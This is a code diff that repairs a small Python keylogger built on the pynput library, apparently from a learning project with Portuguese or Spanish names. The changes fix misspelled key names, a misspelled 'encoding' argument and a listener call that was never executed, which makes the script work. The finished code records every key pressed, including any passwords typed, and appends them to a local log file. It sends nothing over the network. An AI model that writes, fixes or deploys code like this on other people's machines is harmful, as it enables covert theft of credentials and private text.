@@ -2,8 +2,8 @@ from pynput import keyboard
 IGNORAR = {
     keyboard.Key.shift,
     keyboard.Key.shift_r,
-    keyboard.Key.crtl_r,
-    keyboard.Key.crtl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.ctrl_l,
     keyboard.Key.alt_r,
     keyboard.Key.alt_l,
     keyboard.Key.caps_lock,
@@ -12,10 +12,10 @@ IGNORAR = {
 
 def on_press(key):
     try:
-        with open("log.txt", "a", enconding="utf-8") as f:
+        with open("log.txt", "a", encoding="utf-8") as f:
             f.write(key.char)
     except AttributeError:
-        with open("log.txt", "a", enconding="utf-8") as f:
+        with open("log.txt", "a", encoding="utf-8") as f:
             if key == keyboard.Key.space:
                 f.write(" ")
             elif key ==keyboard.Key.enter:
@@ -32,4 +32,4 @@ def on_press(key):
                 f.write(key.name)
 
 with keyboard.Listener(on_press = on_press) as listener:
-    (listener.join)
+    listener.join()
